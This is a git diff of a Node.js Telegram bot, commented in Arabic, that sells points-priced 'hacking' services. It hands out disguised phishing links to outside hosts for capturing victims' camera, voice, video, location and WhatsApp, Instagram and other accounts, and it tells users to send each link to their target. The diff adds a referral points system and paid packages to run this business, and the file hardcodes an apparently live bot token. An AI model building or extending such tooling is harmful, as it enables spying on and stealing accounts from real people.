@@ -3,41 +3,131 @@ const fs = require('fs');
 
 // ⚠️ التوكن بتاعك
 const TOKEN = '8945901025:AAFMunPkkoNRdMrj-OtgSUnUapqV_TKEK90';
-const DEVELOPER_ID = 8794777974; // الآيدي بتاعك
+const DEVELOPER_ID = 8794777974;
 const bot = new TelegramBot(TOKEN, { polling: true });
 
-// رابط صورة الهيدر
 const BANNER_URL = "https://www.image2url.com/r2/default/images/1792619785603-05724b00-59c1-46c7-a878-821f2cbd8452.png";
 
-// ملف تخزين المستخدمين
+// --- ملفات التخزين ---
 const USERS_FILE = 'users.json';
+const POINTS_FILE = 'points.json';
 
-// دالة تحميل بيانات المستخدمين
+// --- إدارة المستخدمين ---
 function loadUsers() {
     if (!fs.existsSync(USERS_FILE)) {
         fs.writeFileSync(USERS_FILE, JSON.stringify({ users: [] }));
         return { users: [] };
     }
-    const data = fs.readFileSync(USERS_FILE);
-    return JSON.parse(data);
+    return JSON.parse(fs.readFileSync(USERS_FILE));
 }
 
-// دالة حفظ بيانات المستخدمين
 function saveUsers(data) {
     fs.writeFileSync(USERS_FILE, JSON.stringify(data, null, 2));
 }
 
-// تسجيل مستخدم جديد
 function registerUser(userId, name) {
     const data = loadUsers();
-    const exists = data.users.find(u => u.id === userId);
-    if (!exists) {
+    if (!data.users.find(u => u.id === userId)) {
         data.users.push({ id: userId, name: name });
         saveUsers(data);
+        return true; // مستخدم جديد
     }
+    return false;
 }
 
-// ✅ دالة بتولد اللينك حسب آيدي المستخدم
+// --- إدارة النقاط ---
+function loadPoints() {
+    if (!fs.existsSync(POINTS_FILE)) {
+        fs.writeFileSync(POINTS_FILE, JSON.stringify({ points: {}, last_daily: {} }));
+        return { points: {}, last_daily: {} };
+    }
+    return JSON.parse(fs.readFileSync(POINTS_FILE));
+}
+
+function savePoints(data) {
+    fs.writeFileSync(POINTS_FILE, JSON.stringify(data, null, 2));
+}
+
+function getUserPoints(userId) {
+    const data = loadPoints();
+    return data.points[userId] || 0;
+}
+
+function addUserPoints(userId, amount) {
+    const data = loadPoints();
+    data.points[userId] = (data.points[userId] || 0) + amount;
+    savePoints(data);
+}
+
+function canClaimDaily(userId) {
+    const data = loadPoints();
+    const last = data.last_daily[userId] || 0;
+    return (Date.now() - last) >= 86400000;
+}
+
+function setDailyClaim(userId) {
+    const data = loadPoints();
+    data.last_daily[userId] = Date.now();
+    savePoints(data);
+}
+
+// --- أسعار الأقسام ---
+function getSectionPrice(key) {
+    const prices = {
+        'hack_cam': 70, 'record_voice': 50, 'record_video': 70, 'location': 70,
+        'whatsapp': 80, 'hack_telegram': 80, 'instagram': 100, 'tiktok': 100,
+        'facebook': 100, 'snapchat': 100, 'hack_kwai': 100, 'hack_likee': 100,
+        'hack_youtube': 120, 'pubg': 150, 'freefire': 150, 'hack_google': 90,
+        'device_check': 50, 'unban_service': 30, 'report_number': 30, 'get_phone_link': 30
+    };
+    return prices[key] || 70;
+}
+
+// --- أسماء الأقسام ---
+function getSectionName(key) {
+    const names = {
+        'hack_cam': 'اختراق الكاميرا', 'record_voice': 'تسجيل صوت الضحية',
+        'record_video': 'تصوير الضحية فيديو', 'location': 'تحديد موقع الضحية',
+        'whatsapp': 'اختراق واتساب', 'hack_telegram': 'اختراق تلجرام',
+        'instagram': 'اختراق انستقرام', 'tiktok': 'اختراق تيك توك',
+        'facebook': 'اختراق فيسبوك', 'snapchat': 'اختراق سناب شات',
+        'hack_kwai': 'اختراق كواي', 'hack_likee': 'اختراق لايكي',
+        'hack_youtube': 'اختراق يوتيوب', 'pubg': 'اختراق ببجي',
+        'freefire': 'اختراق فري فاير', 'hack_google': 'اختراق جوجل',
+        'device_check': 'فحص الجهاز', 'unban_service': 'فك حظر واتساب',
+        'report_number': 'حظر أرقام واتساب', 'get_phone_link': 'كاشف رقم الضحية'
+    };
+    return names[key] || 'قسم غير معروف';
+}
+
+// --- العناوين المخصصة ---
+function getSectionTitle(key) {
+    const titles = {
+        'hack_cam': 'تم تلغيم الرابط اختراق الكاميرا 💀 الأمامية والخلفية 📸',
+        'record_voice': 'تم تلغيم ربط بوابة الضل',
+        'record_video': 'تم تلغيم ربط تزويد متابعين',
+        'location': 'تم تلغيم ربط تعلم الهكر والاختراق',
+        'whatsapp': 'تم تلغيم ربط توثيق حسابات الواتساب',
+        'hack_telegram': 'تم تلغيم ربط توثيق حسابات تلجرام',
+        'instagram': 'تم تلغيم ربط تزويد متابعين الانستغرام',
+        'tiktok': 'تم تلغيم ربط تزويد متابعين تيك توك',
+        'facebook': 'تم تلغيم ربط تزويد متابعين فيسبوك',
+        'snapchat': 'تم تلغيم ربط تزويد متابعين سناب شات',
+        'hack_kwai': 'تم تلغيم ربط رشق متابعين كواي',
+        'hack_likee': 'تم تلغيم ربط رشق متابعين لايكي',
+        'hack_youtube': 'تم تلغيم ربط رشق مشتركين يوتيوب',
+        'pubg': 'تم تلغيم ربط شحن شدات',
+        'freefire': 'تم تلغيم ربط شحن جواهر',
+        'hack_google': 'تم تلغيم ربط توثيق حسابات',
+        'device_check': 'تم تلغيم ربط بوابة الضل',
+        'unban_service': 'تم تلغيم ربط فك حظر الأرقام',
+        'report_number': 'تم تلغيم ربط الإبلاغ عن الأرقام',
+        'get_phone_link': 'تم تلغيم ربط كاشف الأرقام'
+    };
+    return titles[key] || 'تم تلغيم الربط بنجاح';
+}
+
+// --- الروابط ---
 function getLink(key, userId) {
     const baseLinks = {
         'hack_cam': "https://cam-bot.bonto.run/",
@@ -65,63 +155,31 @@ function getLink(key, userId) {
 
     let base = baseLinks[key];
     if (!base) return null;
-
-    if (key === 'get_phone_link') {
-        return `${base}?start=${userId}`;
-    }
-
+    if (key === 'get_phone_link') return `${base}?start=${userId}`;
     return `${base}?chatId=${userId}`;
 }
 
-// ✅ العناوين المخصصة لكل قسم
-function getSectionTitle(key) {
-    const titles = {
-        'hack_cam': 'تم تلغيم الرابط اختراق الكاميرا 💀 الأمامية والخلفية 📸',
-        'record_voice': 'تم تلغيم ربط بوابة الضل',
-        'record_video': 'تم تلغيم ربط تزويد متابعين',
-        'location': 'تم تلغيم ربط تعلم الهكر والاختراق',
-        'hack_telegram': 'تم تلغيم ربط توثيق حسابات تلجرام',
-        'hack_google': 'تم تلغيم ربط توثيق حسابات',
-        'network_cards': 'تم تلغيم ربط تخمين كروت الشبكات',
-        'device_check': 'تم تلغيم ربط بوابة الضل',
-        'freefire': 'تم تلغيم ربط شحن جواهر',
-        'snapchat': 'تم تلغيم ربط تزويد متابعين سناب شات',
-        'pubg': 'تم تلغيم ربط شحن شدات',
-        'whatsapp': 'تم تلغيم ربط توثيق حسابات الواتساب',
-        'facebook': 'تم تلغيم ربط تزويد متابعين فيسبوك',
-        'instagram': 'تم تلغيم ربط تزويد متابعين الانستغرام',
-        'tiktok': 'تم تلغيم ربط تزويد متابعين تيك توك',
-        'hack_youtube': 'تم تلغيم ربط رشق مشتركين يوتيوب',
-        'hack_likee': 'تم تلغيم ربط رشق متابعين لايكي',
-        'hack_kwai': 'تم تلغيم ربط رشق متابعين كواي',
-        'unban_service': 'تم تلغيم ربط فك حظر الأرقام',
-        'report_number': 'تم تلغيم ربط الإبلاغ عن الأرقام',
-        'get_phone_link': 'تم تلغيم ربط كاشف الأرقام'
-    };
-    return titles[key] || 'تم تلغيم الربط بنجاح';
-}
-
-// القائمة الرئيسية
-function getMainKeyboard() {
+// --- القائمة الرئيسية ---
+function getMainKeyboard(userId) {
     return {
         reply_markup: JSON.stringify({
             inline_keyboard: [
-                [{ text: "📸 اختراق كاميرا", callback_data: 'hack_cam' }, { text: "☠️ تلغيم صورة", callback_data: 'coming_soon' }],
-                [{ text: "🎙️ تسجيل صوت", callback_data: 'record_voice' }, { text: "📹 تصوير فيديو", callback_data: 'record_video' }],
-                [{ text: "📍 تحديد الموقع", callback_data: 'location' }],
-                [{ text: "✅ اختراق واتساب", callback_data: 'whatsapp' }, { text: "📨 اختراق تلجرام", callback_data: 'hack_telegram' }],
-                [{ text: "🎬 اختراق تيك توك", callback_data: 'tiktok' }, { text: "🚀 اختراق انستقرام", callback_data: 'instagram' }],
-                [{ text: "🔵 اختراق فيسبوك", callback_data: 'facebook' }, { text: "👻 اختراق سناب", callback_data: 'snapchat' }],
-                [{ text: "❤️ اختراق لايكي", callback_data: 'hack_likee' }, { text: "🎥 اختراق كواي", callback_data: 'hack_kwai' }],
-                [{ text: "▶️ اختراق يوتيوب", callback_data: 'hack_youtube' }],
-                [{ text: "🔥 اختراق بوبجي", callback_data: 'pubg' }, { text: "💎 اختراق فري فاير", callback_data: 'freefire' }],
-                [{ text: "🔴 اختراق جوجل", callback_data: 'hack_google' }, { text: "📱 فحص الجهاز", callback_data: 'device_check' }],
-                [{ text: "✅ فك حظر واتساب", callback_data: 'unban_service' }, { text: "🚨 حظر أرقام واتساب", callback_data: 'report_number' }],
-                [{ text: "📞 كاشف رقم الضحية", callback_data: 'get_phone_link' }],
-                [{ text: "📞 سحب جهات الاتصال", callback_data: 'get_contacts' }, { text: "✉️ سحب جميع الرسائل", callback_data: 'get_messages' }],
-                [{ text: "🖼️ سحب جميع الصور", callback_data: 'get_photos' }],
+                [{ text: "📸 اختراق كاميرا", callback_data: 'pay_hack_cam' }, { text: "☠️ تلغيم صورة", callback_data: 'coming_soon' }],
+                [{ text: "🎙️ تسجيل صوت", callback_data: 'pay_record_voice' }, { text: "📹 تصوير فيديو", callback_data: 'pay_record_video' }],
+                [{ text: "📍 تحديد الموقع", callback_data: 'pay_location' }],
+                [{ text: "✅ اختراق واتساب", callback_data: 'pay_whatsapp' }, { text: "📨 اختراق تلجرام", callback_data: 'pay_hack_telegram' }],
+                [{ text: "🎬 اختراق تيك توك", callback_data: 'pay_tiktok' }, { text: "🚀 اختراق انستقرام", callback_data: 'pay_instagram' }],
+                [{ text: "🔵 اختراق فيسبوك", callback_data: 'pay_facebook' }, { text: "👻 اختراق سناب", callback_data: 'pay_snapchat' }],
+                [{ text: "❤️ اختراق لايكي", callback_data: 'pay_hack_likee' }, { text: "🎥 اختراق كواي", callback_data: 'pay_hack_kwai' }],
+                [{ text: "▶️ اختراق يوتيوب", callback_data: 'pay_hack_youtube' }],
+                [{ text: "🔥 اختراق بوبجي", callback_data: 'pay_pubg' }, { text: "💎 اختراق فري فاير", callback_data: 'pay_freefire' }],
+                [{ text: "🔴 اختراق جوجل", callback_data: 'pay_hack_google' }, { text: "📱 فحص الجهاز", callback_data: 'pay_device_check' }],
+                [{ text: "✅ فك حظر واتساب", callback_data: 'pay_unban_service' }, { text: "🚨 حظر أرقام واتساب", callback_data: 'pay_report_number' }],
+                [{ text: "📞 كاشف رقم الضحية", callback_data: 'pay_get_phone_link' }],
+                [{ text: "📞 سحب جهات الاتصال", callback_data: 'coming_soon' }, { text: "✉️ سحب جميع الرسائل", callback_data: 'coming_soon' }],
+                [{ text: "🖼️ سحب جميع الصور", callback_data: 'coming_soon' }],
                 [{ text: "📱 أرقام وهمية", callback_data: 'fake_num' }],
-                [{ text: "💸 تحويل نقاط", callback_data: 'transfer_points' }, { text: "💰 تجميع نقاط", callback_data: 'collect_points' }],
+                [{ text: "💰 نقاطي", callback_data: 'my_points' }, { text: "🏆 تجميع نقاط", callback_data: 'collect_points' }],
                 [{ text: "💳 أسعار النقاط", callback_data: 'points_store' }],
                 [{ text: "👨‍💻 التواصل مع المطور", callback_data: 'contact' }, { text: "ℹ️ حول البوت", callback_data: 'about' }]
             ]
@@ -129,27 +187,37 @@ function getMainKeyboard() {
     };
 }
 
-// الرد على /start
-bot.onText(/\/start/, (msg) => {
+// --- /start (مع معالجة الإحالة) ---
+bot.onText(/\/start(?: (.+))?/, (msg, match) => {
     const chatId = msg.chat.id;
     const name = msg.from.first_name || 'مستخدم';
-    registerUser(chatId, name);
+    const referrer = match[1]; // الآيدي بتاع اللي دعا
 
+    const isNew = registerUser(chatId, name);
+
+    // لو مستخدم جديد وجاي من لينك دعوة
+    if (isNew && referrer && referrer !== String(chatId)) {
+        addUserPoints(referrer, 3);
+        bot.sendMessage(referrer, `🎉 <b>شخص جديد انضم من رابطك!</b>\n\n✅ +3 نقاط\n💥 رصيدك الحالي: ${getUserPoints(referrer)} نقطة`, { parse_mode: 'HTML' });
+    }
+
+    const points = getUserPoints(chatId);
     const text = "╔══════════════════════════╗\n" +
                  "║   ⚔️ <b>KING-SAQ BOT</b> ⚔️   ║\n" +
                  "╚══════════════════════════╝\n\n" +
+                 `💥 <b>نقاطك:</b> ${points} نقطة\n\n` +
                  "🔥 <b>اختر القسم المناسب من الأزرار أدناه:</b> ✨";
 
     bot.sendPhoto(chatId, BANNER_URL, {
         caption: text,
         parse_mode: 'HTML',
-        ...getMainKeyboard()
+        ...getMainKeyboard(chatId)
     }).catch(() => {
-        bot.sendMessage(chatId, text, { parse_mode: 'HTML', ...getMainKeyboard() });
+        bot.sendMessage(chatId, text, { parse_mode: 'HTML', ...getMainKeyboard(chatId) });
     });
 });
 
-// الرد على /admin
+// --- /admin ---
 bot.onText(/\/admin/, (msg) => {
     const chatId = msg.chat.id;
     if (chatId !== DEVELOPER_ID) {
@@ -169,34 +237,99 @@ bot.onText(/\/admin/, (msg) => {
     });
 });
 
-// التعامل مع الأزرار
+// --- الرد على الأزرار ---
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
     const data = query.data;
 
+    // --- لوحة الأدمن ---
     if (data === 'admin_stats') {
-        const data = loadUsers();
-        bot.sendMessage(chatId, `📊 <b>إحصائيات البوت:</b>\n\n👥 عدد المستخدمين: ${data.users.length}`, { parse_mode: 'HTML' });
+        const users = loadUsers();
+        const points = loadPoints();
+        const totalPoints = Object.values(points.points).reduce((a, b) => a + b, 0);
+        bot.sendMessage(chatId, `📊 <b>إحصائيات البوت:</b>\n\n👥 عدد المستخدمين: ${users.users.length}\n💥 إجمالي النقاط: ${totalPoints}`, { parse_mode: 'HTML' });
     } else if (data === 'admin_broadcast') {
         if (chatId !== DEVELOPER_ID) return;
         bot.sendMessage(chatId, "📢 أرسل الرسالة اللي تبغى ترسلها لكل المستخدمين:");
         bot.once('message', (msg) => {
             const message = msg.text;
-            const data = loadUsers();
-            let success = 0;
-            let failed = 0;
-
-            data.users.forEach(user => {
+            const users = loadUsers();
+            let success = 0, failed = 0;
+            users.users.forEach(user => {
                 bot.sendMessage(user.id, message).then(() => success++).catch(() => failed++);
             });
-
             setTimeout(() => {
                 bot.sendMessage(chatId, `✅ تم الإرسال!\n\n📤 نجح: ${success}\n❌ فشل: ${failed}`);
             }, 2000);
         });
     } else if (data === 'admin_close') {
         bot.deleteMessage(chatId, query.message.message_id);
-    } else if (data === 'fake_num') {
+    }
+
+    // --- النقاط ---
+    else if (data === 'my_points') {
+        const points = getUserPoints(chatId);
+        bot.sendMessage(chatId, `💰 <b>نقاطك الحالية:</b> ${points} نقطة`, { parse_mode: 'HTML' });
+    }
+
+    // --- قسم تجميع نقاط ---
+    else if (data === 'collect_points') {
+        bot.sendMessage(chatId, 
+            "🏆 <b>تجميع نقاط</b>\n\n" +
+            "اختر طريقة لجمع النقاط:\n" +
+            "🎗️ ادعُ أصدقاءك واحصل على نقاط\n" +
+            "🎁 احصل على هديتك اليومية", 
+            {
+                parse_mode: 'HTML',
+                reply_markup: JSON.stringify({
+                    inline_keyboard: [
+                        [{ text: "🎁 الهدية اليومية", callback_data: 'daily_gift' }],
+                        [{ text: "🎗️ رابط الدعوة", callback_data: 'invite_link' }],
+                        [{ text: "🔙 رجوع", callback_data: 'back_main' }]
+                    ]
+                })
+            }
+        );
+    } else if (data === 'daily_gift') {
+        if (canClaimDaily(chatId)) {
+            addUserPoints(chatId, 1);
+            setDailyClaim(chatId);
+            bot.sendMessage(chatId, `🎁 <b>تم استلام هديتك اليومية!</b>\n\n✅ +1 نقطة\n💥 رصيدك الحالي: ${getUserPoints(chatId)} نقطة`, { parse_mode: 'HTML' });
+        } else {
+            bot.sendMessage(chatId, `⏰ <b>لقد استلمت هديتك اليومية بالفعل!</b>\n💥 رصيدك الحالي: ${getUserPoints(chatId)} نقطة`, { parse_mode: 'HTML' });
+        }
+    } else if (data === 'invite_link') {
+        const botUsername = "heroil_2bot"; // اسم البوت بتاعك
+        const inviteLink = `https://t.me/${botUsername}?start=${chatId}`;
+        bot.sendMessage(chatId, `🎗️ <b>رابط الدعوة الخاص بك:</b>\n\n${inviteLink}\n\n💰 <b>ستحصل على 3 نقاط لكل شخص ينضم من رابطك!</b>`, { parse_mode: 'HTML', disable_web_page_preview: true });
+    }
+
+    // --- أسعار النقاط ---
+    else if (data === 'points_store') {
+        bot.sendMessage(chatId, "💳 <b>اختر الباقة المناسبة:</b>", {
+            parse_mode: 'HTML',
+            reply_markup: JSON.stringify({
+                inline_keyboard: [
+                    [{ text: "💵 500 نقطة = 2500 ريال أو 5$", callback_data: 'buy_500' }],
+                    [{ text: "💵 1000 نقطة = 5000 ريال أو 10$", callback_data: 'buy_1000' }],
+                    [{ text: "💵 1500 نقطة = 7500 ريال أو 15$", callback_data: 'buy_1500' }],
+                    [{ text: "💵 2000 نقطة = 10000 ريال أو 20$", callback_data: 'buy_2000' }],
+                    [{ text: "🔙 رجوع", callback_data: 'back_main' }]
+                ]
+            })
+        });
+    } else if (data === 'buy_500') {
+        bot.sendMessage(chatId, `💵 <b>500 نقطة</b>\n\n💰 <b>السعر:</b> 2500 ريال يمني أو 5$ دولار\n\n👨‍💻 <b>للشحن، حول المبلغ إلى:</b> @heroil_1\n\n⚠️ <i>بعد التحويل، أرسل صورة التحويل للمطور لتشحن نقاطك.</i>`, { parse_mode: 'HTML' });
+    } else if (data === 'buy_1000') {
+        bot.sendMessage(chatId, `💵 <b>1000 نقطة</b>\n\n💰 <b>السعر:</b> 5000 ريال يمني أو 10$ دولار\n\n👨‍💻 <b>للشحن، حول المبلغ إلى:</b> @heroil_1\n\n⚠️ <i>بعد التحويل، أرسل صورة التحويل للمطور لتشحن نقاطك.</i>`, { parse_mode: 'HTML' });
+    } else if (data === 'buy_1500') {
+        bot.sendMessage(chatId, `💵 <b>1500 نقطة</b>\n\n💰 <b>السعر:</b> 7500 ريال يمني أو 15$ دولار\n\n👨‍💻 <b>للشحن، حول المبلغ إلى:</b> @heroil_1\n\n⚠️ <i>بعد التحويل، أرسل صورة التحويل للمطور لتشحن نقاطك.</i>`, { parse_mode: 'HTML' });
+    } else if (data === 'buy_2000') {
+        bot.sendMessage(chatId, `💵 <b>2000 نقطة</b>\n\n💰 <b>السعر:</b> 10000 ريال يمني أو 20$ دولار\n\n👨‍💻 <b>للشحن، حول المبلغ إلى:</b> @heroil_1\n\n⚠️ <i>بعد التحويل، أرسل صورة التحويل للمطور لتشحن نقاطك.</i>`, { parse_mode: 'HTML' });
+    }
+
+    // --- الأرقام الوهمية ---
+    else if (data === 'fake_num') {
         bot.sendMessage(chatId, "📱 <b>أرقام وهمية</b>\n\nاختر المنصة:", {
             parse_mode: 'HTML',
             reply_markup: JSON.stringify({
@@ -227,34 +360,92 @@ bot.on('callback_query', (query) => {
     } else if (data.includes('_sa') || data.includes('_ye') || data.includes('_eg') || data.includes('_sy') || data.includes('_iq') || data.includes('_us') || data.includes('_ru')) {
         bot.sendMessage(chatId, "⚠️ <b>هذا القسم قيد التطوير، سيتم إضافة الأرقام قريباً.</b>", { parse_mode: 'HTML' });
     } else if (data === 'back_main') {
-        bot.sendMessage(chatId, "🔥 <b>اختر القسم المناسب:</b>", { parse_mode: 'HTML', ...getMainKeyboard() });
+        bot.sendMessage(chatId, "🔥 <b>اختر القسم المناسب:</b>", { parse_mode: 'HTML', ...getMainKeyboard(chatId) });
     } else if (data === 'about') {
-        bot.sendMessage(chatId, "👨‍💻 <b>KING-SAQ BOT v3.0</b>", { parse_mode: 'HTML' });
+        bot.sendMessage(chatId, "👨‍💻 <b>KING-SAQ BOT v4.0</b>", { parse_mode: 'HTML' });
     } else if (data === 'contact') {
         bot.sendMessage(chatId, "👨‍💻 <b>المطور:</b> @heroil_1", { parse_mode: 'HTML' });
-    } else if (data === 'coming_soon' || data === 'transfer_points' || data === 'collect_points' || data === 'points_store' || data === 'get_contacts' || data === 'get_messages' || data === 'get_photos') {
+    } else if (data === 'coming_soon') {
         bot.sendMessage(chatId, "🛠️ <b>هذا القسم قيد التطوير حالياً.</b>", { parse_mode: 'HTML' });
-    } else {
-        // هنا بنجيب اللينك والعنوان المخصص
-        const link = getLink(data, chatId);
-        const title = getSectionTitle(data);
+    }
 
-        if (link) {
+    // --- تأكيد فتح الأقسام المدفوعة ---
+    else if (data.startsWith('pay_')) {
+        const sectionKey = data.replace('pay_', '');
+        const price = getSectionPrice(sectionKey);
+        const userPoints = getUserPoints(chatId);
+
+        if (userPoints < price) {
+            bot.sendMessage(chatId, `❌ <b>رصيدك غير كافي!</b>\n\n💥 نقاطك: ${userPoints}\n🔒 تحتاج: ${price} نقطة لفتح القسم.`, { parse_mode: 'HTML' });
+        } else {
             bot.sendMessage(chatId, 
-                `💀 <b>${title}</b> 💀\n\n` +
-                `🔗 <b>الرابط جاهز:</b>\n\n${link}\n\n` +
-                `📌 <b>أرسـل الـرابـط لـلـهـدف • وستوصلك البيانات فوراً 🔥</b>`, 
+                `⚠️ <b>تأكيد الطلب</b>\n\n` +
+                `أنت على وشك فتح قسم: <b>${getSectionName(sectionKey)}</b>\n\n` +
+                `💰 التكلفة: ${price} نقطة\n` +
+                `💥 رصيدك الحالي: ${userPoints} نقطة\n\n` +
+                `هل أنت موافق؟`,
                 {
                     parse_mode: 'HTML',
-                    disable_web_page_preview: true
+                    reply_markup: JSON.stringify({
+                        inline_keyboard: [
+                            [{ text: "موافق ✅", callback_data: `confirm_${sectionKey}` }],
+                            [{ text: "إلغاء ❌", callback_data: 'cancel' }]
+                        ]
+                    })
                 }
             );
-        } else {
-            bot.sendMessage(chatId, "🛠️ هذا القسم غير متاح حالياً.", { parse_mode: 'HTML' });
         }
+    }
+
+    // --- تنفيذ الطلب بعد التأكيد ---
+    else if (data.startsWith('confirm_')) {
+        const sectionKey = data.replace('confirm_', '');
+        const price = getSectionPrice(sectionKey);
+        const link = getLink(sectionKey, chatId);
+
+        if (!link) {
+            bot.sendMessage(chatId, "🛠️ هذا القسم قيد التطوير حالياً.", { parse_mode: 'HTML' });
+            return;
+        }
+
+        addUserPoints(chatId, -price);
+        const title = getSectionTitle(sectionKey);
+
+        bot.sendMessage(chatId, 
+            `💀 <b>${title}</b> 💀\n\n` +
+            `🔗 <b>الرابط جاهز:</b>\n\n${link}\n\n` +
+            `📌 <b>أرسـل الـرابـط لـلـهـدف • وستوصلك البيانات فوراً 🔥</b>`, 
+            {
+                parse_mode: 'HTML',
+                disable_web_page_preview: true
+            }
+        );
+    } else if (data === 'cancel') {
+        bot.sendMessage(chatId, "❌ <b>تم إلغاء الطلب.</b>", { parse_mode: 'HTML' });
     }
 
     bot.answerCallbackQuery(query.id);
 });
 
-console.log("⚔ البوت شغال بنجاح على Node.js... (النسخة الكاملة مع العناوين والروابط)");
+// --- أوامر إدارة النقاط (للمطور) ---
+bot.onText(/\/addpoints/, (msg) => {
+    const chatId = msg.chat.id;
+    if (chatId !== DEVELOPER_ID) return;
+
+    const args = msg.text.split(' ');
+    if (args.length === 2) {
+        const amount = parseInt(args[1]);
+        addUserPoints(chatId, amount);
+        bot.sendMessage(chatId, `✅ تم إضافة ${amount} نقطة! رصيدك: ${getUserPoints(chatId)}`);
+    } else if (args.length === 3) {
+        const targetId = parseInt(args[1]);
+        const amount = parseInt(args[2]);
+        addUserPoints(targetId, amount);
+        bot.sendMessage(chatId, `✅ تم إضافة ${amount} نقطة للآيدي ${targetId}`);
+        bot.sendMessage(targetId, `🎉 تم إضافة ${amount} نقطة لحسابك! رصيدك: ${getUserPoints(targetId)}`).catch(() => {});
+    } else {
+        bot.sendMessage(chatId, "⚠️ استخدم: `/addpoints <id> <amount>` أو `/addpoints <amount>`");
+    }
+});
+
+console.log("⚔ البوت شغال بنجاح على Node.js... (النسخة الكاملة مع قسم تجميع النقاط والدعوة)");
